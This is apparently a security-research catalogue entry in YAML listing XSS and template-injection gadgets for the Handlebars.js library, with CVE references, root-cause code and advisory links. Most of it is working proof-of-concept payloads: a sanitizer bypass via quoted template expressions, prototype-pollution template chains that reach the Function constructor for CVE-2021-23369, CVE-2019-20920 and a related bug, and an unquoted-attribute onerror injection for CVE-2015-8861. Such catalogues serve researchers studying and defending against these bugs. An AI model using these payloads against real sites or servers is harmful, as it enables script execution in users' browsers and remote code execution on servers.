---
description: Handlebars provides the power necessary to let you build semantic templates effectively with no frustration. Handlebars is largely compatible with Mustache templates. In most cases it is possible to swap out Mustache with Handlebars and continue using your current templates.
github: handlebars-lang/handlebars.js
gadgets:
  Latest:
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - a-tag
      - href-attr
      - any-attr
      - func-call-parameter
    pocs:
      - description: |
          In the case of sanitized input, it may be possible to exploit the null replacement behavior in [Handlebars.js](https://github.com/handlebars-lang/handlebars.js) templates to bypass the sanitizer when an invalid template is used.

          *For this to work, quotes must be used in the template because [Handlebars.js](https://github.com/handlebars-lang/handlebars.js) template engine waits for: `ID`, `STRING`, `NUMBER`, `BOOLEAN`, `UNDEFINED`, `NULL` or `DATA`.*
        code: |
          <!-- user input -->
          <div id="template"><a href="java{{'a" x="'}}script:alert(document.domain)">Click Me</a></div>

          <script src="https://cdn.jsdelivr.net/npm/handlebars@latest/dist/handlebars.min.js"></script>
          <script>
            const source = document.getElementById("template").innerHTML;
            const template = Handlebars.compile(source);
            const context = { name: "<h1>hello</h1>" };
            document.getElementById("template").innerHTML = template(context);
          </script>
      - description: The same behavior can be abused in case of 2 **raw** injection points.
        code: |
          <div id="template">
            <img src="[current-location]/<!-- user input 1 -->{{'">
            <div>Random Text</div>
            <!-- user input 2 -->'}}" onerror="alert(document.domain)">
            <div>Random Text</div>
          </div>

          <script src="https://cdn.jsdelivr.net/npm/handlebars@latest/dist/handlebars.min.js"></script>
          <script>
            const source = document.getElementById("template").innerHTML;
            const template = Handlebars.compile(source);
            const context = { name: "<h1>hello</h1>" };
            document.getElementById("template").innerHTML = template(context);
          </script>
  ≤4.7.6:
    cve: CVE-2021-23369
    authors:
      - Francois Lajeunesse-Robert
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - any-attr
      - unsafe-eval-csp
      - func-call-parameter
    pocs:
      - description: |
          There was a prototype pollution in [Handlebars.js](https://github.com/handlebars-lang/handlebars.js) that allowed to execute JavaScript code.

          *On server-side usage, this is a Remote Code Execution (RCE).*
        code: |
          <script nonce="secret" src="https://cdnjs.cloudflare.com/ajax/libs/handlebars.js/4.7.6/handlebars.min.js"></script>
          <script nonce="secret">
            // user input
            var s = `
            {{#with (__lookupGetter__ "__proto__")}}
            {{#with (./constructor.getOwnPropertyDescriptor . "valueOf")}}
            {{#with ../constructor.prototype}}
            {{../../constructor.defineProperty . "hasOwnProperty" ..}}
            {{/with}}
            {{/with}}
            {{/with}}
            {{#with "constructor"}}
            {{#with split}}
            {{pop (push "alert(document.domain);")}}
            {{#with .}}
            {{#with (concat (lookup join (slice 0 1)))}}
            {{#each (slice 2 3)}}
            {{#with (apply 0 ../..)}}
            {{.}}
            {{/with}}
            {{/each}}
            {{/with}}
            {{/with}}
            {{/with}}
            {{/with}}
            `;
            var template = Handlebars.compile(s, { strict: true });
            template({}); 
          </script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/handlebars-lang/handlebars.js/blob/e6ad93ea01bcde1f8ddaa4b4ebe572dd616abfaa/lib/handlebars/runtime.js#L121">https://github.com/handlebars-lang/handlebars.js/blob/e6ad93ea01bcde1f8ddaa4b4ebe572dd616abfaa/lib/handlebars/runtime.js#L121</a>

      ```javascript
      strict: function(obj, name, loc) {
        if (!obj || !(name in obj)) {
          throw new Exception('"' + name + '" not defined in ' + obj, {
            loc: loc
          });
        }
        return obj[name];
      },
      ```
    links:
      - https://github.com/advisories/GHSA-765h-qjxv-5f44
      - https://github.com/handlebars-lang/handlebars.js/commit/f0589701698268578199be25285b2ebea1c1e427
      - https://security.snyk.io/vuln/SNYK-JS-HANDLEBARS-1056767
      - https://security.snyk.io/vuln/SNYK-JS-HANDLEBARS-1279029
  ≤3.0.7&≤4.5.1:
    cve: CVE-2019-20920
    authors:
      - Francois Lajeunesse-Robert
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - any-attr
      - unsafe-eval-csp
      - func-call-parameter
    pocs:
      - description: |
          There was a prototype pollution in [Handlebars.js](https://github.com/handlebars-lang/handlebars.js) that allowed to execute JavaScript code.

          *On server-side usage, this is a Remote Code Execution (RCE).*
        code: |
          <script nonce="secret" src="https://cdnjs.cloudflare.com/ajax/libs/handlebars.js/4.5.1/handlebars.min.js"></script>

          <script nonce="secret">
            // user input
            var s = `
              {{#with "constructor"}} {{#with split as |a|}} {{pop (push "alert(document.domain);")}} {{#with (concat (lookup join (slice 0 1)))}} {{#each (slice 2 3)}} {{#with (apply 0 a)}} {{.}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}}
            `;
            var template = Handlebars.compile(s);
            template({}); 
          </script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/handlebars-lang/handlebars.js/blob/v4.5.1/lib/handlebars/helpers/lookup.js">https://github.com/handlebars-lang/handlebars.js/blob/v4.5.1/lib/handlebars/helpers/lookup.js</a>

      ```javascript
      export default function(instance) {
        instance.registerHelper('lookup', function(obj, field) {
          if (!obj) {
            return obj;
          }
          if (field === 'constructor' && !obj.propertyIsEnumerable(field)) {
            return undefined;
          }
          return obj[field];
        });
      }
      ```
    links:
      - https://github.com/advisories/GHSA-3cqr-58rm-57f8
      - https://github.com/handlebars-lang/handlebars.js/commit/d54137810a49939fd2ad01a91a34e182ece4528e
      - https://security.snyk.io/vuln/SNYK-JS-HANDLEBARS-534478
  ≤4.0.13:
    authors:
      - Mahmoud Gamal
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - any-attr
      - unsafe-eval-csp
      - func-call-parameter
    pocs:
      - description: |
          There was a prototype pollution in [Handlebars.js](https://github.com/handlebars-lang/handlebars.js) that allowed to execute JavaScript code.

          *On server-side usage, this is a Remote Code Execution (RCE).*
        code: |
          <script nonce="secret" src="https://cdnjs.cloudflare.com/ajax/libs/handlebars.js/4.0.13/handlebars.min.js"></script>

          <script nonce="secret">
            // user input
            var s = `
              {{#with "s" as |string|}}
                {{#with "e"}}
                  {{#with split as |conslist|}}
                    {{this.pop}}
                    {{this.push (lookup string.sub "constructor")}}
                    {{this.pop}}
                    {{#with string.split as |codelist|}}
                      {{this.pop}}
                      {{this.push "return alert(document.domain);"}}
                      {{this.pop}}
                      {{#each conslist}}
                        {{#with (string.sub.apply 0 codelist)}}
                          {{this}}
                        {{/with}}
                      {{/each}}
                    {{/with}}
                  {{/with}}
                {{/with}}
              {{/with}}
            `;
            var template = Handlebars.compile(s);
            template({}); 
          </script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/handlebars-lang/handlebars.js/blob/8d22e6f501dc0720fe0610bb4dab60cae18e7d20/lib/handlebars/compiler/javascript-compiler.js#L15">https://github.com/handlebars-lang/handlebars.js/blob/8d22e6f501dc0720fe0610bb4dab60cae18e7d20/lib/handlebars/compiler/javascript-compiler.js#L15</a>

      ```javascript
      nameLookup: function(parent, name/* , type*/) {
        if (JavaScriptCompiler.isValidJavaScriptVariableName(name)) {
          return [parent, '.', name];
        } else {
          return [parent, '[', JSON.stringify(name), ']'];
        }
      }
      ```
    links:
      - https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html
      - https://github.com/advisories/GHSA-q42p-pg8m-cqh6
  ≤3.0.7&≤4.2.2:
    cve: CVE-2019-19919
    authors:
      - twitter:itszn13
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - any-attr
      - unsafe-eval-csp
      - func-call-parameter
    pocs:
      - description: |
          There was a prototype pollution in [Handlebars.js](https://github.com/handlebars-lang/handlebars.js) that allowed to execute JavaScript code.

          *On server-side usage, this is a Remote Code Execution (RCE).*
        code: |
          I didn't managed to find the PoC for this vulnerability...
        preview: false
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/handlebars-lang/handlebars.js/blob/55e4d9d80d5dd834fcf53c528e7e0aa080f315a5/lib/handlebars/base.js#L214">https://github.com/handlebars-lang/handlebars.js/blob/55e4d9d80d5dd834fcf53c528e7e0aa080f315a5/lib/handlebars/base.js#L214</a>

      ```javascript
      instance.registerHelper('lookup', function(obj, field) {
        if (!obj) {
          return obj;
        }
        if (field === 'constructor' && !obj.propertyIsEnumerable(field)) {
          return undefined;
        }
        return obj[field];
      });
      ```
    links:
      - https://github.com/advisories/GHSA-w457-6q6x-cgp9
      - https://github.com/handlebars-lang/handlebars.js/commit/156061eb7707575293613d7fdf90e2bdaac029ee
      - https://security.snyk.io/vuln/SNYK-JS-HANDLEBARS-469063
  ≤3.0.8:
    cve: CVE-2015-8861
    authors:
      - twitter:Matias P. Brutti
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - any-attr
      - func-call-parameter
    pocs:
      - description: The [Handlebars.js](https://github.com/handlebars-lang/handlebars.js) library did not prevent unquoted templated attribute values from adding arbitrary new attributes containing spaces.
        code: |
          <!-- user input -->
          <div id="template"></div>

          <script src="https://cdnjs.cloudflare.com/ajax/libs/handlebars.js/3.0.7/handlebars.min.js"></script>
          <script>
            const template = Handlebars.compile(`<img src={{userinput}}>`);
            const context = { userinput: "a onerror=alert(document.domain)" };
            document.getElementById("template").innerHTML = template(context);
          </script>
    links:
      - https://github.com/handlebars-lang/handlebars.js/commit/83b8e846a3569bd366cf0b6bdc1e4604d1a2077e
      - https://security.snyk.io/vuln/npm:handlebars:20151207
---
